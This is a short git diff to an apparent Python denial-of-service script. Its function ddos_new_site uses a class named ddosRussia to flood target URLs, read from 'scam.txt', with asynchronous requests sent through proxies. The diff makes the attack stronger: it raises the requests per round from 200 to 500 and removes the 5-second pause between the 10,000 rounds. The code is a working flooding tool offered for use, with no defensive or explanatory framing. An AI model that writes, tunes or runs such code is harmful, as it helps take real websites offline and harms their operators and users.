@@ -48,12 +48,11 @@ def take_urls(file = 'scam.txt'):
 
 def ddos_new_site(url, proxy):
     ddos_site = ddosRussia(url, proxy)
-    ntimes = 200
+    ntimes = 500
     for i in range(10000):
         start_time = time.time()
         resp = asyncio.run(ddos_site.fetch_async(ntimes))
         print(f'Valid requests: {resp.count(True)}/{len(resp)} for site: {url} during {time.time() - start_time} seconds')
-        time.sleep(5)
         
 if __name__ == '__main__':
     # asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
